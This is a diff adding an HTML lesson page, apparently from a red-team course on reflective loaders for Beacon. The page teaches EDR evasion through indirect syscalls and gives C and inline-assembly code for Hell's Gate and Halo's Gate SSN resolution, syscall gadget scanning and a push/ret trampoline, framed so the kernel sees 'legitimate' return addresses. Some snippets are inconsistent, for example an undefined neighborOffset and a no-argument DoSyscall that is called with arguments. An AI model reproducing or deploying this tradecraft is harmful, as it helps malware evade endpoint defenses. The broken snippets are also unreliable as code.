@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4: LibGate &mdash; Indirect Syscalls - Crystal-Loaders Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F48E;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#f43f5e;--accent2:#fb923c;--gradient:linear-gradient(135deg,#f43f5e,#fb923c)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Crystal-Loaders</h2>
+<span>PIC Reflective Loaders</span>
+</div>
+<a class="home-link" href="../CrystalLoaders_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. The Reflective Loader Problem</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Crystal Palace &mdash; The PIC Linker</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. LibTCG &mdash; The Tradecraft Garden</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module4.html"><span>4. LibGate &mdash; Indirect Syscalls</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. The UDRL Loader Walkthrough</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Beacon User Data (BUD)</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module7.html"><span>7. Post-Ex UDRL &amp; Aggressor</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Extending Crystal-Loaders</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 4: LibGate &mdash; Indirect Syscalls</h1>
+<p class="subtitle">RecycledGate lineage, the SYSCALL_GATE structure, Hell's Gate + Halo's Gate SSN extraction, and the push/ret trampoline for executing syscalls from ntdll's address space.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand why <strong>indirect syscalls</strong> exist, how LibGate resolves System Service Numbers from clean and hooked stubs, and how the <code>push; ret</code> trampoline redirects execution into ntdll so the kernel sees a legitimate return address. By the end of this module you will be able to trace the full path from <code>GetSyscall()</code> through <code>PrepareSyscall()</code> and <code>DoSyscall()</code> to the kernel transition.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Why Indirect Syscalls?</h2>
+
+<p>Direct syscalls were the first evolution beyond calling hooked ntdll stubs. By embedding the <code>syscall</code> instruction (opcode <code>0F 05</code>) directly in the malware's <code>.text</code> section, early tools like SysWhispers1 and Hell's Gate avoided EDR inline hooks entirely. But direct syscalls introduced three new detection vectors:</p>
+
+<ul>
+<li><strong>Detection Vector 1 &mdash; Static Signature:</strong> The bytes <code>0F 05</code> should never appear in a normal user-mode binary's <code>.text</code> section. Only ntdll legitimately contains <code>syscall</code> instructions. Any other module with those bytes is immediately suspicious to static analysis engines.</li>
+<li><strong>Detection Vector 2 &mdash; Return Address Validation:</strong> When <code>syscall</code> transitions to the kernel, the CPU saves the return address (RIP) into the trap frame. After the kernel completes the call, the saved return address points back to wherever <code>syscall</code> executed &mdash; which is the malware's code, <strong>not ntdll</strong>. Windows <code>InstrumentationCallback</code> and kernel ETW telemetry can check this return address and flag it if it falls outside ntdll's address range.</li>
+<li><strong>Detection Vector 3 &mdash; Call Stack Analysis:</strong> A legitimate syscall call stack always includes an ntdll frame. When a direct syscall executes from attacker memory, the stack walk reveals no ntdll frame at all &mdash; a clear anomaly for any stack-walking EDR.</li>
+</ul>
+
+<p><strong>Indirect syscalls</strong> solve all three problems by jumping to a <code>syscall; ret</code> gadget <strong>inside ntdll</strong>. The actual <code>syscall</code> instruction executes from ntdll's address space, so the return address points into ntdll, the <code>0F 05</code> bytes live in a legitimate module, and the call stack contains an ntdll frame.</p>
+
+<div class="versus">
+<div>
+<h5 style="color:var(--red)">Direct Syscall</h5>
+<ul>
+<li><code>syscall</code> instruction in attacker's <code>.text</code></li>
+<li>Return address points to attacker code</li>
+<li>No ntdll frame on the call stack</li>
+<li><code>0F 05</code> bytes in non-ntdll module</li>
+<li>Detected by InstrumentationCallback</li>
+</ul>
+</div>
+<div>
+<h5 style="color:var(--green)">Indirect Syscall</h5>
+<ul>
+<li><code>syscall</code> instruction inside ntdll's memory</li>
+<li>Return address points into ntdll</li>
+<li>ntdll frame present on the stack</li>
+<li><code>0F 05</code> bytes in legitimate module</li>
+<li>Passes InstrumentationCallback checks</li>
+</ul>
+</div>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. RecycledGate &mdash; The Origin</h2>
+
+<p>LibGate descends from <strong>RecycledGate</strong>, created by <strong>thefLink</strong> (<code>github.com/thefLink/RecycledGate</code>). RecycledGate was one of the first public implementations that combined two techniques:</p>
+
+<ul>
+<li><strong>Hell's Gate</strong> (by am0nsec &amp; smelly__vx) &mdash; Pattern-matching the syscall stub bytes to extract the SSN directly from the <code>mov eax, imm32</code> instruction.</li>
+<li><strong>Halo's Gate</strong> (by Sektor7 / reenz0h) &mdash; When the target stub is hooked and Hell's Gate fails, search neighboring stubs at fixed offsets to find an unhooked neighbor and compute the SSN arithmetically.</li>
+</ul>
+
+<p>RecycledGate combined these two SSN resolution strategies with <strong>indirect syscall trampolining</strong> &mdash; instead of executing the <code>syscall</code> instruction in its own code, it jumps to the <code>syscall; ret</code> gadget inside ntdll's own stub. The name "Recycled" refers to <strong>reusing ntdll's own syscall gadgets</strong> rather than embedding new ones.</p>
+
+<div class="card">
+<h4>From RecycledGate to LibGate</h4>
+<p>RecycledGate used internal <strong>djb2 hash resolution</strong> to find target functions in ntdll's export table. LibGate, rasta-mouse's Crystal Palace port, removes this coupling. Instead of hashing internally, LibGate takes the ntdll base address and function pointer as <strong>external parameters</strong>, resolved by the caller via the Crystal Palace DFR (Dynamic Function Resolution) system. This makes LibGate <strong>hash-algorithm-agnostic</strong> &mdash; the caller can use djb2, ROR13, CRC32, or any other hash to find the function before passing it to LibGate.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>3. LibGate Architecture</h2>
+
+<p>LibGate is rasta-mouse's Crystal Palace port of RecycledGate. It lives in two files: <code>gate.c</code> and <code>gate.h</code>. The entire API surface consists of one structure and three functions.</p>
+
+<h3>The SYSCALL_GATE Structure</h3>
+
+<pre><code><span class="lang-tag">C (gate.h)</span>typedef struct {
+    DWORD ssn;       // System Service Number (index into SSDT)
+    PVOID jmpAddr;   // Address of syscall;ret gadget inside ntdll
+} SYSCALL_GATE;</code></pre>
+
+<p>This structure is the output of SSN resolution. It stores everything needed to execute an indirect syscall: the SSN to load into EAX, and the address to jump to for the actual <code>syscall</code> instruction.</p>
+
+<h3>The Three Functions</h3>
+
+<pre><code><span class="lang-tag">C (gate.h)</span>// Resolve the SSN and syscall gadget address for a given Nt* function
+BOOL GetSyscall     (PVOID ntdll, PVOID func, SYSCALL_GATE * gate);
+
+// Stage the SSN and jump address in registers (r11, r10)
+void PrepareSyscall (DWORD ssn, PVOID addr);
+
+// Execute the syscall via push/ret trampoline
+void DoSyscall      ();</code></pre>
+
+<div class="card green">
+<h4>Key Architectural Difference</h4>
+<p><code>GetSyscall()</code> takes the <strong>ntdll base address</strong> and <strong>function pointer</strong> as parameters. These are resolved externally by the caller &mdash; typically via Crystal Palace's DFR directive. RecycledGate resolved these internally using djb2 hashing. By externalizing resolution, LibGate becomes a <strong>pure syscall execution engine</strong> that is independent of any specific function resolution strategy.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. GetSyscall() &mdash; The Core Algorithm</h2>
+
+<p>The <code>GetSyscall()</code> function resolves the SSN and locates the indirect syscall gadget. It follows a four-step process: pattern match the target stub, detect hooks, search neighbors if hooked, and find the <code>syscall; ret</code> gadget address.</p>
+
+<h3>Step 1 &mdash; Pattern Match (Hell's Gate)</h3>
+
+<p>The function first checks the target stub's leading bytes for the clean (unhooked) pattern:</p>
+
+<pre><code><span class="lang-tag">Byte Pattern</span>Offset  Bytes          Instruction
+------  -------------  ----------------------------
+0x00    4C 8B D1       mov r10, rcx
+0x03    B8 xx xx       mov eax, &lt;SSN_LO&gt; &lt;SSN_HI&gt;
+0x05    00 00          (upper bytes, always 0 for valid SSNs &lt; 0x200)</code></pre>
+
+<p>If the first four bytes match <code>4C 8B D1 B8</code>, the stub is clean. The SSN is extracted from bytes 4 and 5:</p>
+
+<pre><code><span class="lang-tag">C (Hell's Gate Check)</span>// Check for clean stub signature: 4C 8B D1 B8
+PBYTE stub = (PBYTE)func;
+
+if (stub[0] == 0x4C &amp;&amp;    // mov r10, rcx (byte 1)
+    stub[1] == 0x8B &amp;&amp;    // mov r10, rcx (byte 2)
+    stub[2] == 0xD1 &amp;&amp;    // mov r10, rcx (byte 3)
+    stub[3] == 0xB8)       // mov eax, imm32 (opcode)
+{
+    // SSN is the 16-bit little-endian value at offset 4-5
+    gate-&gt;ssn = (stub[5] &lt;&lt; 8) | stub[4];
+    // ... proceed to find syscall;ret gadget
+}</code></pre>
+
+<h3>Step 2 &mdash; Hook Detection</h3>
+
+<p>If the first byte is <code>0xE9</code> (the JMP rel32 opcode), the stub has been hooked by an EDR. The EDR replaced the original <code>mov r10, rcx</code> with a 5-byte relative jump to its inspection routine:</p>
+
+<pre><code><span class="lang-tag">C (Hook Detection)</span>BOOL bHooked = FALSE;
+
+// 0xE9 = JMP rel32 (5-byte relative jump)
+if (stub[0] == 0xE9) {
+    bHooked = TRUE;
+    // Cannot extract SSN from this stub - bytes are overwritten
+    // Fall through to neighbor search (Halo's Gate)
+}</code></pre>
+
+<h3>Step 3 &mdash; Neighbor Search (Halo's Gate)</h3>
+
+<p>When the target stub is hooked, LibGate searches neighboring stubs. In ntdll, syscall stubs are laid out sequentially at <strong>32-byte intervals</strong>, and SSNs are consecutive. If the stub at offset <code>+2</code> (64 bytes later) is clean and has SSN 0x1A, then the target stub's SSN is <code>0x1A - 2 = 0x18</code>.</p>
+
+<pre><code><span class="lang-tag">C (Halo's Gate - Neighbor Search)</span>if (bHooked) {
+    // Search DOWN: neighbor at stub + (i * 32)
+    for (DWORD i = 1; i &lt; 500; i++) {
+        PBYTE neighbor = stub + (i * 32);
+
+        if (neighbor[0] == 0x4C &amp;&amp;
+            neighbor[1] == 0x8B &amp;&amp;
+            neighbor[2] == 0xD1 &amp;&amp;
+            neighbor[3] == 0xB8)
+        {
+            // Clean neighbor found!
+            // neighbor SSN - i = our SSN (SSNs are sequential)
+            gate-&gt;ssn = ((neighbor[5] &lt;&lt; 8) | neighbor[4]) - i;
+            break;
+        }
+    }
+
+    // Search UP: neighbor at stub - (i * 32)
+    for (DWORD i = 1; i &lt; 500; i++) {
+        PBYTE neighbor = stub - (i * 32);
+
+        if (neighbor[0] == 0x4C &amp;&amp;
+            neighbor[1] == 0x8B &amp;&amp;
+            neighbor[2] == 0xD1 &amp;&amp;
+            neighbor[3] == 0xB8)
+        {
+            // Clean neighbor found!
+            // neighbor SSN + i = our SSN
+            gate-&gt;ssn = ((neighbor[5] &lt;&lt; 8) | neighbor[4]) + i;
+            break;
+        }
+    }
+}</code></pre>
+
+<div class="card warn">
+<h4>Why Neighbor Search Works</h4>
+<p>EDRs hook selectively. Out of 400+ Nt* syscall stubs in ntdll, an EDR typically hooks only the high-value targets: <code>NtAllocateVirtualMemory</code>, <code>NtWriteVirtualMemory</code>, <code>NtCreateThread</code>, etc. Hooking every stub would cause severe performance degradation. There are always unhooked neighbors within a few stubs of any hooked target.</p>
+</div>
+
+<h3>Step 4 &mdash; Find the syscall;ret Gadget</h3>
+
+<p>Whether the SSN came from the target stub (Step 1) or a neighbor (Step 3), LibGate now needs the address of the <code>syscall; ret</code> instruction sequence within the resolved stub. It scans for the three-byte pattern <code>0F 05 C3</code>:</p>
+
+<pre><code><span class="lang-tag">C (Gadget Search)</span>// Scan the stub for the syscall;ret gadget: 0F 05 C3
+// Even hooked stubs usually preserve these bytes at the end
+PBYTE target = bHooked ? (stub + (neighborOffset * 32)) : stub;
+
+for (DWORD offset = 0; offset &lt; 32; offset++) {
+    if (target[offset]     == 0x0F &amp;&amp;   // syscall (byte 1)
+        target[offset + 1] == 0x05 &amp;&amp;   // syscall (byte 2)
+        target[offset + 2] == 0xC3)     // ret
+    {
+        gate-&gt;jmpAddr = &amp;target[offset]; // Address of syscall;ret in ntdll
+        break;
+    }
+}</code></pre>
+
+<p>The <code>jmpAddr</code> now points to the <code>0F 05 C3</code> bytes inside ntdll's memory. When execution jumps here, the CPU will execute <code>syscall</code> from ntdll's address range and then <code>ret</code> back to the caller.</p>
+
+<div class="diagram">
+<h4>GetSyscall() Resolution Flow</h4>
+<div class="flow">
+<div class="box">Read stub<br>bytes at func</div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">Pattern match<br><small>4C 8B D1 B8?</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box y">Hook check<br><small>byte[0] == E9?</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">Neighbor scan<br><small>&plusmn;32-byte stubs</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box g">Find 0F 05 C3<br><small>syscall;ret gadget</small></div>
+</div>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. The Push/Ret Trampoline</h2>
+
+<p>Once <code>GetSyscall()</code> has resolved the SSN and gadget address, the caller uses <code>PrepareSyscall()</code> and <code>DoSyscall()</code> to actually execute the syscall. These two functions implement a <strong>push/ret trampoline</strong> &mdash; a technique that uses the stack to redirect execution into ntdll without a direct <code>jmp</code>.</p>
+
+<h3>PrepareSyscall &mdash; Stage the Registers</h3>
+
+<pre><code><span class="lang-tag">x86-64 ASM</span>; PrepareSyscall(DWORD ssn, PVOID addr)
+; Windows x64 calling convention: ecx = ssn, rdx = addr
+PrepareSyscall:
+    xor  r11, r11          ; Zero r11
+    xor  r10, r10          ; Zero r10
+    mov  r11d, ecx         ; r11d = SSN (first param)
+    mov  r10, rdx          ; r10  = jmpAddr (second param, ntdll gadget)
+    ret                    ; Return to caller</code></pre>
+
+<h3>DoSyscall &mdash; Execute via Push/Ret</h3>
+
+<pre><code><span class="lang-tag">x86-64 ASM</span>; DoSyscall()
+; Called after PrepareSyscall staged r11 (SSN) and r10 (jmpAddr)
+; The caller has already placed syscall arguments in RCX, RDX, R8, R9
+DoSyscall:
+    push r10               ; Push ntdll gadget address onto the stack
+    xor  rax, rax          ; Zero rax
+    mov  r10, rcx          ; r10 = rcx (Windows syscall ABI: kernel reads arg1 from r10)
+    mov  eax, r11d         ; eax = SSN (System Service Number)
+    ret                    ; Pop ntdll gadget address into RIP &rarr; jump to syscall;ret</code></pre>
+
+<p>The critical trick is in the last two instructions: <code>push r10</code> places the ntdll gadget address on top of the stack, and <code>ret</code> pops it into RIP. The CPU now executes from ntdll's <code>syscall; ret</code> sequence. After the kernel returns, the <code>ret</code> in ntdll's gadget pops the <strong>original return address</strong> (placed by the caller of <code>DoSyscall</code>) and returns control to the loader.</p>
+
+<div class="diagram">
+<h4>Push/Ret Trampoline &mdash; Full Execution Flow</h4>
+<div class="flow" style="flex-direction:column;gap:4px;align-items:stretch;max-width:680px;margin:0 auto">
+<div class="box" style="width:100%"><strong>1.</strong> Caller invokes <code>PrepareSyscall(ssn, jmpAddr)</code> &rarr; stores SSN in r11, gadget addr in r10</div>
+<div class="box" style="width:100%"><strong>2.</strong> Caller sets up RCX, RDX, R8, R9 with the actual syscall arguments</div>
+<div class="box" style="width:100%"><strong>3.</strong> Caller invokes <code>DoSyscall()</code></div>
+<div class="box hl" style="width:100%"><strong>4.</strong> DoSyscall pushes r10 (ntdll gadget address) onto the stack</div>
+<div class="box hl" style="width:100%"><strong>5.</strong> Sets r10 = rcx (Windows ABI: kernel reads 1st arg from r10), eax = SSN</div>
+<div class="box y" style="width:100%"><strong>6.</strong> <code>ret</code> pops ntdll gadget address into RIP &mdash; CPU jumps to ntdll</div>
+<div class="box g" style="width:100%"><strong>7.</strong> CPU executes <code>syscall</code> <strong>from ntdll's address space</strong></div>
+<div class="box g" style="width:100%"><strong>8.</strong> Kernel transition: kernel sees return address in ntdll &mdash; passes validation</div>
+<div class="box" style="width:100%"><strong>9.</strong> Kernel returns, ntdll's <code>ret</code> pops the original return address</div>
+<div class="box" style="width:100%"><strong>10.</strong> Execution returns to the original caller cleanly</div>
+</div>
+</div>
+
+<div class="card">
+<h4>Why Push/Ret Instead of JMP?</h4>
+<p>A <code>jmp r10</code> would also redirect execution to ntdll, but it does not place a return address on the stack. The <code>syscall; ret</code> gadget in ntdll ends with <code>ret</code>, which pops the top of the stack into RIP. With <code>push r10; ... ret</code>, the stack is set up so that:</p>
+<ul>
+<li><code>ret</code> in DoSyscall pops the ntdll gadget address &rarr; jumps to ntdll</li>
+<li><code>ret</code> after <code>syscall</code> in ntdll pops the caller's return address &rarr; returns to loader</li>
+</ul>
+<p>The two <code>ret</code> instructions chain together naturally through the stack, giving clean bidirectional control flow.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. LibGate in GCC Inline Assembly</h2>
+
+<p>Crystal Palace builds with <strong>MinGW (GCC)</strong>, not MSVC. This matters because MSVC does not support inline x64 assembly at all. MinGW does, using GCC's inline assembly syntax. LibGate uses the <code>__attribute__((naked))</code> function attribute to emit pure assembly without compiler-generated prologue/epilogue code:</p>
+
+<pre><code><span class="lang-tag">C (gate.c - GCC Inline ASM)</span>__attribute__((naked)) void PrepareSyscall(DWORD ssn, PVOID addr) {
+    __asm__(
+        "xor %%r11, %%r11\n"
+        "xor %%r10, %%r10\n"
+        "mov %%ecx, %%r11d\n"
+        "mov %%rdx, %%r10\n"
+        "ret\n"
+    );
+}
+
+__attribute__((naked)) void DoSyscall() {
+    __asm__(
+        "push %%r10\n"
+        "xor %%rax, %%rax\n"
+        "mov %%rcx, %%r10\n"
+        "mov %%r11d, %%eax\n"
+        "ret\n"
+    );
+}</code></pre>
+
+<div class="card">
+<h4>AT&amp;T vs Intel Syntax</h4>
+<p>GCC uses <strong>AT&amp;T syntax</strong> by default (registers prefixed with <code>%%</code>, source-destination order reversed). However, the Crystal Palace build system can pass the <code>-masm=intel</code> flag to switch to Intel syntax. With that flag, the assembly looks identical to the MASM/NASM style shown in Section 5. The <code>naked</code> attribute ensures the compiler emits no prologue (<code>push rbp; mov rbp, rsp</code>) or epilogue (<code>pop rbp; ret</code>) &mdash; the function body is purely what the programmer writes.</p>
+</div>
+
+<p>This GCC requirement is why Crystal-Loaders (and Crystal Palace in general) targets the <strong>MinGW toolchain</strong>. The entire build pipeline &mdash; from COFF object compilation through PIC linking &mdash; uses GCC and its associated linker, not the MSVC toolchain.</p>
+
+<!-- ============================================================ -->
+<h2>7. Technique Comparison</h2>
+
+<p>LibGate sits in the lineage of syscall evasion techniques. This table shows how it compares to prior art across the key dimensions: SSN resolution method, execution strategy, hook bypass capability, and where the return address points after the syscall.</p>
+
+<table>
+<thead>
+<tr><th>Technique</th><th>SSN Source</th><th>Execution</th><th>Hook Bypass</th><th>Return Addr</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Hell's Gate</strong></td><td>Stub pattern match</td><td>Direct syscall</td><td style="color:var(--red)">No (fails if hooked)</td><td>In malware</td></tr>
+<tr><td><strong>Halo's Gate</strong></td><td>Neighbor search</td><td>Direct syscall</td><td style="color:var(--green)">Yes</td><td>In malware</td></tr>
+<tr><td><strong>SysWhispers2</strong></td><td>Sort by address</td><td>Direct syscall</td><td style="color:var(--green)">Yes</td><td>In malware</td></tr>
+<tr><td><strong>SysWhispers3</strong></td><td>Sort by address</td><td>Indirect (jmp ntdll)</td><td style="color:var(--green)">Yes</td><td>In ntdll</td></tr>
+<tr><td><strong>RecycledGate</strong></td><td>Hell+Halo pattern</td><td>Indirect (push;ret)</td><td style="color:var(--green)">Yes</td><td>In ntdll</td></tr>
+<tr><td><strong>LibGate</strong></td><td>Hell+Halo (external resolve)</td><td>Indirect (push;ret)</td><td style="color:var(--green)">Yes</td><td>In ntdll</td></tr>
+</tbody>
+</table>
+
+<p>The key evolution across these techniques is twofold: first, from <strong>failing on hooks</strong> (Hell's Gate) to <strong>handling hooks gracefully</strong> (Halo's Gate, SysWhispers2); second, from <strong>direct execution</strong> (return address in malware) to <strong>indirect execution</strong> (return address in ntdll). LibGate combines both advances while decoupling from any specific hash algorithm.</p>
+
+<!-- ============================================================ -->
+<h2>8. Usage Pattern in Crystal-Loaders</h2>
+
+<p>In the Crystal-Loaders codebase, LibGate is not called directly by the main loader code. Instead, a wrapper function <code>ResolveSyscallEntry()</code> bridges the DFR-resolved function pointer and LibGate's <code>GetSyscall()</code>:</p>
+
+<pre><code><span class="lang-tag">C (Crystal-Loaders)</span>void ResolveSyscallEntry(PVOID ntdll, PVOID func, SYSCALL_API_ENTRY * entry)
+{
+    SYSCALL_GATE gate;
+    memset(&amp;gate, 0, sizeof(SYSCALL_GATE));
+
+    if (GetSyscall(ntdll, func, &amp;gate))
+    {
+        entry-&gt;fnAddr  = func;       // Original function address (for reference)
+        entry-&gt;sysnum  = gate.ssn;   // Resolved System Service Number
+        entry-&gt;jmpAddr = gate.jmpAddr; // ntdll syscall;ret gadget address
+    }
+}</code></pre>
+
+<p>The <code>SYSCALL_API_ENTRY</code> structure stores the resolved data for later use. When the loader needs to execute a syscall (for example, <code>NtAllocateVirtualMemory</code> to map memory for the Beacon payload), it follows this sequence:</p>
+
+<pre><code><span class="lang-tag">C (Calling Pattern)</span>// 1. Prepare - stage SSN and gadget address in r11/r10
+PrepareSyscall(entry-&gt;sysnum, entry-&gt;jmpAddr);
+
+// 2. Execute - the compiler places NtAllocateVirtualMemory's args
+//    in RCX, RDX, R8, R9 per the x64 calling convention,
+//    then DoSyscall() trampolines into ntdll
+NTSTATUS status = DoSyscall(
+    hProcess,          // RCX &rarr; ProcessHandle
+    &amp;baseAddress,      // RDX &rarr; *BaseAddress
+    0,                 // R8  &rarr; ZeroBits
+    &amp;regionSize,       // R9  &rarr; *RegionSize
+    MEM_COMMIT | MEM_RESERVE,  // [rsp+0x28]
+    PAGE_READWRITE             // [rsp+0x30]
+);</code></pre>
+
+<div class="card highlight">
+<h4>The Complete Chain</h4>
+<p>Putting it all together, the Crystal-Loaders syscall path is:</p>
+<ol style="padding-left:20px;line-height:2;">
+<li><strong>DFR</strong> resolves the ntdll base and target function address (hash-agnostic)</li>
+<li><strong>GetSyscall()</strong> extracts the SSN via Hell's Gate / Halo's Gate and locates the <code>syscall;ret</code> gadget</li>
+<li><strong>PrepareSyscall()</strong> stages the SSN and gadget address in r11/r10</li>
+<li><strong>DoSyscall()</strong> trampolines execution into ntdll via <code>push; ret</code></li>
+<li>The kernel sees a return address inside ntdll &mdash; everything looks legitimate</li>
+</ol>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz" id="quiz1">
+<h4>Module 4 Quiz: LibGate &mdash; Indirect Syscalls</h4>
+
+<div class="quiz-q" data-correct="2">
+<p>Q1: Why does LibGate's DoSyscall use <code>push r10; ... ret</code> instead of <code>jmp r10</code>?</p>
+<label data-opt="0"><input type="radio" name="q1_0"> It's faster than a direct jump</label>
+<label data-opt="1"><input type="radio" name="q1_0"> It avoids modifying the flags register</label>
+<label data-opt="2"><input type="radio" name="q1_0"> The ret pops the ntdll gadget address into RIP, and the ret after syscall returns to the original caller cleanly</label>
+<label data-opt="3"><input type="radio" name="q1_0"> It's required by the Windows calling convention</label>
+<div class="explain">The <code>push r10; ret</code> pattern places the ntdll gadget address on the stack, then <code>ret</code> pops it into RIP to redirect execution. Crucially, this leaves the caller's original return address as the next entry on the stack. After ntdll's <code>syscall; ret</code> executes, that second <code>ret</code> pops the original return address, returning control to the loader cleanly. A <code>jmp r10</code> would jump to ntdll but would not set up the stack correctly for the return path.</div>
+</div>
+
+<div class="quiz-q" data-correct="1">
+<p>Q2: How does Halo's Gate resolve an SSN when the target stub is hooked?</p>
+<label data-opt="0"><input type="radio" name="q2_0"> It reads the SSN from a file on disk</label>
+<label data-opt="1"><input type="radio" name="q2_0"> It searches neighboring stubs at &plusmn;32 byte offsets and adjusts the SSN by the distance</label>
+<label data-opt="2"><input type="radio" name="q2_0"> It queries the kernel directly via a separate syscall</label>
+<label data-opt="3"><input type="radio" name="q2_0"> It uses a hardcoded SSN table</label>
+<div class="explain">Syscall stubs in ntdll are laid out sequentially at 32-byte intervals with consecutive SSNs. Halo's Gate searches neighboring stubs in both directions (&plusmn;32, &plusmn;64, &plusmn;96, etc.) until it finds one that is not hooked. It then reads that neighbor's SSN and adjusts it by the distance (in stub count) to compute the target's SSN. This works because EDRs only hook a subset of the 400+ available syscall stubs.</div>
+</div>
+
+<div class="quiz-q" data-correct="0">
+<p>Q3: What makes LibGate different from the original RecycledGate?</p>
+<label data-opt="0"><input type="radio" name="q3_0"> LibGate takes ntdll base and function pointer as params instead of internal hash resolution</label>
+<label data-opt="1"><input type="radio" name="q3_0"> LibGate uses direct syscalls instead of indirect</label>
+<label data-opt="2"><input type="radio" name="q3_0"> LibGate only works on Windows 11</label>
+<label data-opt="3"><input type="radio" name="q3_0"> LibGate supports 32-bit systems</label>
+<div class="explain">RecycledGate uses an internal djb2 hash to resolve target functions from ntdll's export table. LibGate removes this coupling by accepting the ntdll base address and function pointer as external parameters, resolved by the caller (via Crystal Palace's DFR system). This makes LibGate hash-algorithm-agnostic &mdash; the caller can use any hash or resolution strategy to find the function before passing it to LibGate.</div>
+</div>
+
+<button class="quiz-btn" onclick="gradeQuiz('quiz1')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module3.html">&larr; Prev: LibTCG &mdash; The Tradecraft Garden</a>
+<a class="primary" href="module5.html">Next: The UDRL Loader Walkthrough &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
